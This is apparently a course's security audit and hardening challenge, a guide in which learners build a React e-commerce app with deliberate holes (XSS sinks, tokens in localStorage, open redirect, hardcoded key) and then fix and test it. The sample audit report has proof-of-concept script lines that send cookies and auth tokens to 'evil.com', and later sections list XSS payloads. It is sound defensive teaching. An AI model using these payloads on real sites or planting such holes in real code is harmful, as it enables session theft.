# Security Audit & Hardening Challenge - Complete Guide

## 📋 Overview

This challenge combines everything you've learned in Chapter 15 to perform a complete security audit and remediation of a vulnerable application.

**Duration:** 8-10 hours
**Difficulty:** Advanced ⭐⭐⭐

---

## 🎯 Your Mission

You're a security consultant hired to audit and secure an e-commerce platform. The app has **15+ critical vulnerabilities** that you must find and fix.

---

## 📂 Challenge Structure

This challenge is **self-directed** - you'll create the vulnerable app based on common security mistakes, then fix it.

### Option A: Use Provided Vulnerable App
If available, use the starter code provided.

### Option B: Create Your Own Vulnerable App
Create a small e-commerce app with intentional vulnerabilities (see below).

---

## 🐛 Required Vulnerabilities to Include

Your vulnerable app should have these security issues:

### 1. XSS Vulnerabilities (5 issues)
```javascript
// 1. Product reviews with dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{ __html: review.text }} />

// 2. Search results with innerHTML
searchElement.innerHTML = `Results for: ${query}`;

// 3. User profile bio without sanitization
<div>{user.bio}</div> // If bio contains HTML

// 4. Malicious URL in product links
<a href={product.website}>Visit</a>

// 5. Comment system without validation
<div>{comment.content}</div>
```

### 2. Authentication Issues (3 issues)
```javascript
// 1. Token in localStorage
localStorage.setItem('authToken', token);

// 2. No CSRF protection
fetch('/api/checkout', {
  method: 'POST'
  // No CSRF token!
});

// 3. Session never expires
// No expiration check in backend
```

### 3. Missing Security Headers (7 headers)
```javascript
// No CSP
// No X-Frame-Options
// No HSTS
// No X-Content-Type-Options
// No Referrer-Policy
// No Permissions-Policy
// No X-XSS-Protection
```

### 4. Additional Vulnerabilities (5+ issues)
```javascript
// 1. Open redirect
const next = params.get('next');
window.location = next; // No validation!

// 2. Sensitive data in logs
console.log('Login:', { email, password });

// 3. API keys in code
const STRIPE_KEY = 'sk_live_abc123';

// 4. No input validation
<input onChange={e => setAmount(e.target.value)} />
// No validation before sending to server

// 5. Vulnerable dependencies
// Old versions of packages with known CVEs
```

---

## 📝 Phase-by-Phase Guide

### Phase 1: Security Audit (2 hours)

**Create SECURITY_AUDIT.md:**

```markdown
# Security Audit Report

**Date:** [Date]
**Application:** E-Commerce Platform
**Auditor:** [Your Name]

## Executive Summary

Found **X critical**, **Y high**, **Z medium** vulnerabilities.
Immediate action required for critical issues.

## Critical Vulnerabilities

### 1. XSS in Product Reviews
- **Severity:** Critical
- **Location:** `src/components/ProductReview.jsx:42`
- **Issue:** User reviews rendered with `dangerouslySetInnerHTML` without sanitization
- **Impact:** Attackers can execute arbitrary JavaScript, steal tokens, deface site
- **Proof of Concept:**
  ```javascript
  POST /api/reviews
  { "text": "<script>fetch('https://evil.com?cookie='+document.cookie)</script>" }
  ```
- **Remediation:** Install DOMPurify, sanitize all user HTML
- **Priority:** Fix immediately

### 2. Tokens in localStorage
- **Severity:** Critical
- **Location:** `src/services/authService.js:15`
- **Issue:** Authentication tokens stored in localStorage
- **Impact:** Any XSS attack can steal authentication tokens
- **Proof of Concept:**
  ```javascript
  <script>
    fetch('https://evil.com?token=' + localStorage.getItem('authToken'))
  </script>
  ```
- **Remediation:** Use HttpOnly cookies instead
- **Priority:** Fix immediately

[... Continue for all vulnerabilities ...]
```

**Audit Checklist:**
- [ ] Manual code review
- [ ] Search for dangerous patterns (`grep -r "dangerouslySetInnerHTML"`)
- [ ] Run `npm audit`
- [ ] Check security headers (`curl -I`)
- [ ] Test with XSS payloads
- [ ] Test CSRF attacks
- [ ] Check for sensitive data exposure
- [ ] Review authentication flow

---

### Phase 2: XSS Remediation (2 hours)

**Step 1: Install DOMPurify**
```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

**Step 2: Find All XSS Vulnerabilities**
```bash
grep -r "dangerouslySetInnerHTML" src/
grep -r "innerHTML" src/
grep -r "outerHTML" src/
```

**Step 3: Fix Product Reviews**
```javascript
// BEFORE (Vulnerable)
<div dangerouslySetInnerHTML={{ __html: review.text }} />

// AFTER (Secure)
import DOMPurify from 'dompurify';

<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(review.text, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
  })
}} />
```

**Step 4: Fix URL Validation**
```javascript
// utils/urlValidator.js
export function isValidURL(url) {
  if (!url) return false;
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

// Component
{product.website && isValidURL(product.website) && (
  <a href={product.website}>Visit</a>
)}
```

**Step 5: Test XSS Prevention**

Create test file:
```javascript
// tests/security/xss.test.js
import { render } from '@testing-library/react';
import ProductReview from '../../components/ProductReview';
import DOMPurify from 'dompurify';

describe('XSS Prevention', () => {
  it('should sanitize script tags', () => {
    const malicious = '<script>alert("XSS")</script>Hello';
    const { container } = render(<ProductReview text={malicious} />);

    expect(container.innerHTML).not.toContain('<script>');
    expect(container.textContent).toContain('Hello');
  });

  it('should sanitize event handlers', () => {
    const malicious = '<img src=x onerror="alert(1)">';
    const { container } = render(<ProductReview text={malicious} />);

    expect(container.innerHTML).not.toContain('onerror');
  });

  it('should block javascript: URLs', () => {
    const malicious = 'javascript:alert(1)';
    const { container } = render(<ProductLink url={malicious} />);

    expect(container.querySelector('a')).toBeNull();
  });
});
```

---

### Phase 3: Authentication Hardening (2 hours)

**Step 1: Backend - HttpOnly Cookies**
```javascript
// server/index.js
app.post('/api/auth/login', (req, res) => {
  const { email, password } = req.body;

  // Validate credentials...
  const sessionToken = generateToken();
  const csrfToken = generateCsrfToken();

  sessions.set(sessionToken, {
    userId: user.id,
    csrfToken,
    createdAt: Date.now()
  });

  // ✅ Set HttpOnly cookie
  res.cookie('session', sessionToken, {
    httpOnly: true,              // ✅ Can't access with JS
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',          // ✅ CSRF protection
    maxAge: 30 * 60 * 1000       // ✅ 30 minutes
  });

  res.json({ user, csrfToken });
});
```

**Step 2: Frontend - Remove localStorage**
```javascript
// BEFORE
localStorage.setItem('authToken', token);

// AFTER - No localStorage!
// Cookies sent automatically
let csrfToken = null;

fetch('/api/auth/login', {
  method: 'POST',
  credentials: 'include',  // ✅ Send cookies
  body: JSON.stringify({ email, password })
});
```

**Step 3: CSRF Protection**
```javascript
// Backend middleware
function verifyCsrf(req, res, next) {
  const token = req.headers['x-csrf-token'];
  if (!token || token !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  next();
}

// Apply to routes
app.post('/api/checkout', requireAuth, verifyCsrf, (req, res) => {
  // Process checkout
});

// Frontend
fetch('/api/checkout', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'X-CSRF-Token': csrfToken  // ✅ Include token
  },
  body: JSON.stringify(data)
});
```

**Step 4: Session Expiration**
```javascript
function requireAuth(req, res, next) {
  const sessionToken = req.cookies.session;
  const session = sessions.get(sessionToken);

  const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes

  if (!session || Date.now() - session.createdAt > SESSION_TIMEOUT) {
    if (session) sessions.delete(sessionToken);
    res.clearCookie('session');
    return res.status(401).json({ error: 'Session expired' });
  }

  req.session = session;
  next();
}
```

---

### Phase 4: Security Headers (1 hour)

**Option A: Using helmet.js (Recommended)**
```bash
npm install helmet
```

```javascript
// server/index.js
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'", "data:"],
      frameAncestors: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"]
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));
```

**Option B: Manual Configuration**
```javascript
// vite.config.js (development)
export default defineConfig({
  server: {
    headers: {
      'Content-Security-Policy': [
        "default-src 'self'",
        "script-src 'self'",
        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' data: https:",
        "frame-ancestors 'none'"
      ].join('; '),
      'X-Frame-Options': 'DENY',
      'X-Content-Type-Options': 'nosniff',
      // ... other headers
    }
  }
});
```

---

### Phase 5: Dependency Audit (1 hour)

**Step 1: Run Audit**
```bash
npm audit

# Output will show vulnerabilities
# Fix automatically
npm audit fix

# Force fix (may have breaking changes)
npm audit fix --force
```

**Step 2: Review Critical/High Vulnerabilities**
```bash
npm audit --json > audit-report.json
```

**Step 3: Update Vulnerable Packages**
```bash
# Check outdated
npm outdated

# Update specific package
npm install package-name@latest

# Update all (carefully!)
npm update
```

**Step 4: Document Unfixable Vulnerabilities**
```markdown
## Unfixable Vulnerabilities

### lodash <4.17.21 - Prototype Pollution
- **Status:** Cannot fix
- **Reason:** Dependency of react-scripts, no update available
- **Mitigation:** Not exploitable in our usage
- **Tracking:** Issue #123
```

---

### Phase 6: Additional Fixes (1 hour)

**Fix Open Redirects:**
```javascript
// BEFORE (Vulnerable)
const next = new URLSearchParams(location.search).get('next');
window.location = next;

// AFTER (Secure)
function safeRedirect(url) {
  try {
    const parsed = new URL(url, window.location.origin);

    // Only allow same-origin redirects
    if (parsed.origin === window.location.origin) {
      window.location = parsed.href;
    } else {
      console.warn('Blocked external redirect:', url);
      window.location = '/';
    }
  } catch (error) {
    window.location = '/';
  }
}

const next = new URLSearchParams(location.search).get('next');
if (next) safeRedirect(next);
```

**Remove Sensitive Data from Logs:**
```javascript
// BEFORE
console.log('User login:', { email, password }); // ❌

// AFTER
console.log('User login:', { email }); // ✅
// Or use a logger that sanitizes
logger.info('User login', { email }); // password automatically excluded
```

**Move Secrets to Environment Variables:**
```javascript
// BEFORE
const STRIPE_KEY = 'sk_live_abc123'; // ❌

// AFTER
const STRIPE_KEY = import.meta.env.VITE_STRIPE_KEY; // ✅

// .env (gitignored)
VITE_STRIPE_KEY=sk_live_abc123
```

---

### Phase 7: Penetration Testing (1 hour)

**Create Test Suite:**

```html
<!-- tests/penetration/xss-attack.html -->
<!DOCTYPE html>
<html>
<head>
  <title>XSS Attack Simulation</title>
</head>
<body>
  <h1>XSS Test</h1>
  <form id="xss-form">
    <textarea id="payload" placeholder="Enter XSS payload"></textarea>
    <button type="submit">Test XSS</button>
  </form>
  <div id="result"></div>

  <script>
    const payloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror="alert(\'XSS\')">',
      '<svg/onload=alert(\'XSS\')>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>'
    ];

    document.getElementById('xss-form').addEventListener('submit', async (e) => {
      e.preventDefault();
      const payload = document.getElementById('payload').value;

      const response = await fetch('http://localhost:3000/api/reviews', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify({ text: payload })
      });

      if (response.ok) {
        document.getElementById('result').innerHTML =
          '<p>Payload submitted. Check if it executes.</p>';
      }
    });
  </script>
</body>
</html>
```

```html
<!-- tests/penetration/csrf-attack.html -->
<!DOCTYPE html>
<html>
<body>
  <h1>CSRF Attack Simulation</h1>
  <button onclick="attack()">Attempt CSRF</button>
  <div id="result"></div>

  <script>
    async function attack() {
      try {
        const response = await fetch('http://localhost:3000/api/checkout', {
          method: 'POST',
          credentials: 'include',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ amount: 9999 })
        });

        if (response.ok) {
          document.getElementById('result').innerHTML =
            '<p style="color:red">❌ CSRF ATTACK SUCCEEDED! App is vulnerable.</p>';
        } else if (response.status === 403) {
          document.getElementById('result').innerHTML =
            '<p style="color:green">✅ CSRF BLOCKED! App is secure.</p>';
        }
      } catch (error) {
        document.getElementById('result').innerHTML =
          '<p style="color:orange">⚠️ CORS blocked request (good!)</p>';
      }
    }
  </script>
</body>
</html>
```

**Document Results:**
```markdown
# Penetration Test Results

## Test Date: [Date]

### 1. XSS in Product Reviews
- **Payload:** `<script>alert('XSS')</script>`
- **Result:** ✅ PASS - Script sanitized by DOMPurify
- **Evidence:** Review displayed as text, no script execution

### 2. CSRF on Checkout Endpoint
- **Method:** Malicious HTML page from different origin
- **Result:** ✅ PASS - 403 Forbidden returned
- **Evidence:** CSRF token validation working

### 3. Clickjacking via iframe
- **Method:** Embedded app in iframe
- **Result:** ✅ PASS - Refused to frame
- **Evidence:** Console shows "Refused to frame ... because it set 'X-Frame-Options' to 'DENY'"

### 4. Session Hijacking
- **Method:** Attempted to steal session token
- **Result:** ✅ PASS - Token not accessible
- **Evidence:** HttpOnly cookie cannot be read by JavaScript

### 5. Open Redirect
- **Payload:** `?next=https://evil.com`
- **Result:** ✅ PASS - Redirected to homepage
- **Evidence:** URL validation working

## Summary
**Passed:** 5/5 tests
**Failed:** 0/5 tests
**Status:** ✅ All security controls working
```

---

## ✅ Final Checklist

### Code Security
- [ ] No `dangerouslySetInnerHTML` without DOMPurify
- [ ] All URLs validated
- [ ] No `eval()` or `new Function()`
- [ ] No sensitive data in logs
- [ ] No secrets in code
- [ ] Input validation on all forms

### Authentication
- [ ] Tokens in HttpOnly cookies
- [ ] CSRF protection implemented
- [ ] Sessions expire (30 min)
- [ ] Secure logout
- [ ] SameSite cookie attribute

### Security Headers
- [ ] Content-Security-Policy
- [ ] X-Frame-Options
- [ ] Strict-Transport-Security
- [ ] X-Content-Type-Options
- [ ] Referrer-Policy
- [ ] Permissions-Policy
- [ ] X-XSS-Protection

### Dependencies
- [ ] 0 critical vulnerabilities
- [ ] 0 high vulnerabilities
- [ ] All packages up to date

### Testing
- [ ] XSS tests pass
- [ ] CSRF tests pass
- [ ] Clickjacking tests pass
- [ ] All penetration tests pass

### Documentation
- [ ] Security audit report
- [ ] All vulnerabilities documented
- [ ] Fixes documented
- [ ] Security checklist created

---

## 🎉 Completion

You've successfully:
- ✅ Performed comprehensive security audit
- ✅ Fixed all critical vulnerabilities
- ✅ Hardened authentication
- ✅ Configured security headers
- ✅ Passed all penetration tests

**You're now a front-end security expert!** 🔒

